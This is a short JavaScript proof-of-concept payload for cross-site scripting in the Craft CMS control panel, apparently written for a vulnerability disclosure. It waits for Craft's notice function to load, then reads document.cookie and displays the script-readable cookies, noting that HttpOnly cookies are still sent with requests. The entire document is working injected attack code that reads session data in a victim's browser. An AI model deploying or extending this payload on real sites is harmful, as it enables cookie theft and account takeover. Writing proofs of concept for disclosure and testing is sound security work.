const interval = setInterval(() => {
    if (window.Craft && Craft.cp && Craft.cp.displayNotice) {
        clearInterval(interval);

        var jsCookie = document.cookie;

        Craft.cp.displayNotice(
            "XSS PoC:<br>" +
            "Visible cookies to JavaScript: " + jsCookie + "<br>" +
            "HttpOnly cookies exist (not readable by JS).<br>" +
            "Browser will still send them with requests."
        );
    }
}, 300);
